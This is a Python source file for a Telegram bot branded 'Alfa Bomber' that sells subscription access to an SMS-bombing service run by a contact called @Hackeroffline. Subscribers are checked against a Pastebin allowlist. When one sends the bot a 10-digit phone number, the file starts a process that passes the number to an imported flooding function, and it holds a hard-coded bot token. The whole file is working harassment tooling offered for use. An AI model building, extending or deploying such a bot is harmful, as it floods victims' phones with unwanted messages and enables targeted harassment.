import telebot
import requests
import re
import multiprocessing
from sms import smsg
#from sms1 import smsgi
#from sms2 import smsgii
#from sms3 import smsgiii
# Replace 'YOUR_TOKEN' with your actual bot token obtained from BotFather
TOKEN = '7348852517:AAEfqE5U8k2bQcDEn845uCeuwNfiiTshmxE'

# Replace 'PASTEBIN_URL' with the URL of your Pastebin data
PASTEBIN_URL = 'https://pastebin.com/raw/Cyze9HH9'

# Create an instance of the TeleBot class
bot = telebot.TeleBot(TOKEN)

# Define a handler for the '/start' command
@bot.message_handler(commands=['start'])
def handle_start(message):
    # Check if the user is allowed to use the bot
    if check_user_access(message.from_user.id):
        bot.reply_to(message, "𝐇𝐞𝐥𝐥𝐨! 𝐈'𝐦 𝐀𝐥𝐟𝐚 𝐁𝐨𝐦𝐛𝐞𝐫 𝐀𝐝𝐯𝐚𝐧𝐜𝐞 𝐛𝐨𝐦𝐛𝐞𝐫 𝐁𝐨𝐭 𝐜𝐥𝐢𝐜𝐤 𝐡𝐞𝐫𝐞 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 /attack")
    else:
        bot.reply_to(message, "🔐𝙂𝙚𝙩 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙤𝙛 𝙩𝙝𝙞𝙨 𝘽𝙤𝙩 𝘾𝙤𝙣𝙩𝙖𝙘𝙩🔐 @Hackeroffline")

# Define a handler for the '/menu' command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    # Check if the user is allowed to access the menu
    if check_user_access(message.from_user.id):
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝟏𝟎-𝐝𝐢𝐠𝐢𝐭 𝐧𝐮𝐦𝐛𝐞𝐫.")
    else:
        bot.reply_to(message, "💠️ 𝙂𝙚𝙩 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙤𝙛 𝙩𝙝𝙞𝙨 𝘽𝙤𝙩 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 💠 @Hackeroffline.")

# Define a handler for regular text messages
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    # Check if the user is authorized
    if not check_user_access(message.from_user.id):
        bot.reply_to(message, "𝙔𝙤𝙪𝙧 𝙋𝙡𝙖𝙣 ❌ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙❌ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @Hackeroffline")
        return
    
    # Extract a 10-digit number using regular expressions
    match = re.search(r'\b\d{10}\b', message.text)
    if match:
        # If a 10-digit number is found, extract it
        number = match.group(0)
        # Reply to the user with a success message
        bot.reply_to(message, "💣𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐒𝐭𝐚𝐫𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲💣")
        # Send the number to the target URL
        handle_phone_number(message)
        # Add further processing for the number if needed
    else:
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝐯𝐚𝐥𝐢𝐝 𝟏𝟎-𝐝𝐢𝐠𝐢𝐭 𝐧𝐮𝐦𝐛𝐞𝐫.")

# Function to check if the user is allowed to use the bot
def check_user_access(user_id):
    try:
        # Fetch data from Pastebin
        response = requests.get(PASTEBIN_URL)
        pastebin_data = response.text
        
        # Check if the user's ID is in the Pastebin data
        return str(user_id) in pastebin_data
    except Exception as e:
        print("Error:", e)
        return False

# Function to send the extracted number to the target URL

def handle_phone_number(message):
    phone_number = message.text
    attack1 = multiprocessing.Process(target=smsg, args=[phone_number])
  #  attack2 = multiprocessing.Process(target=smsgi, args=[phone_number])
  #  attack3 = multiprocessing.Process(target=smsgii, args=[phone_number])
   # attack4 = multiprocessing.Process(target=smsgiii, args=[phone_number])
    attack1.start()
  #  attack2.start()
  #  attack3.start()
  #  attack4.start()
    
  

# Run the bot
bot.polling()
